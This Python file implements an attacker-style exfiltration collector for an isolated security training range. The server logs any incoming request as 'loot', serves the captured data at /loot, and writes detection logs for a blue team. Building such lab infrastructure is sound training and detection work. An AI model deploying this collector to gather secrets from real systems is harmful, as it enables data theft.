#!/usr/bin/env python3
"""Attacker C2 / exfiltration endpoint.

The data-egress half of the range. NjordScan statically PREDICTS that a secret can
leave the app; the red team makes it happen for real — using its foothold to send a
stolen secret OUT to this attacker-controlled box; and the blue team DETECTS the
egress (any contact with the C2 is exfiltration). This closes the loop on NjordScan's
data-egress tracer end to end.

It accepts data on ANY path/method (GET query or POST body), appends what it captured
to a loot file, and writes the blue-team LOG CONTRACT (svc="c2") for each hit so the
blue team and dashboard see it. Dependency-free (standard library). On the lab's
isolated network only — it never touches the internet.
"""

from __future__ import annotations

import json
import os
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote

PORT = int(os.environ.get("PORT", "9999"))
LOG_DIR = os.environ.get("LOG_DIR", "/logs")
LOOT = os.path.join(LOG_DIR, "c2-loot.txt")
try:
    Path(LOG_DIR).mkdir(parents=True, exist_ok=True)
except OSError:
    pass


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _log(method: str, path: str, query: str, body: str, ip: str, ua: str) -> None:
    try:
        with open(os.path.join(LOG_DIR, "c2.log"), "a", encoding="utf-8") as fh:
            fh.write(json.dumps({
                "ts": _now(), "svc": "c2", "ip": ip, "method": method,
                "path": path, "query": query, "status": 200, "ua": ua,
                "ref": "", "body": (body or "")[:500],
            }) + "\n")
        captured = (query + " " + body).strip()
        if captured:
            with open(LOOT, "a", encoding="utf-8") as fh:
                fh.write(f"[{_now()}] from {ip}: {unquote(captured)[:600]}\n")
    except OSError:
        pass


class _C2(BaseHTTPRequestHandler):
    def log_message(self, *_a):
        pass

    def _hit(self) -> None:
        path, _, query = self.path.partition("?")
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        ip = self.headers.get("x-forwarded-for") or (self.client_address[0] if self.client_address else "")
        _log(self.command, path, query, body, ip, self.headers.get("user-agent", ""))
        if path == "/loot":   # the attacker's view of what's been stolen
            try:
                data = Path(LOOT).read_bytes()
            except OSError:
                data = b"(no loot collected yet)\n"
            self._send(200, data, "text/plain")
            return
        self._send(200, b'{"ok":true}', "application/json")

    def _send(self, code: int, body: bytes, ctype: str) -> None:
        try:
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass

    do_GET = do_POST = do_PUT = do_HEAD = _hit


def main() -> int:
    print(f"[c2] attacker collector listening on :{PORT}  (loot -> {LOOT})", flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), _C2).serve_forever()
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
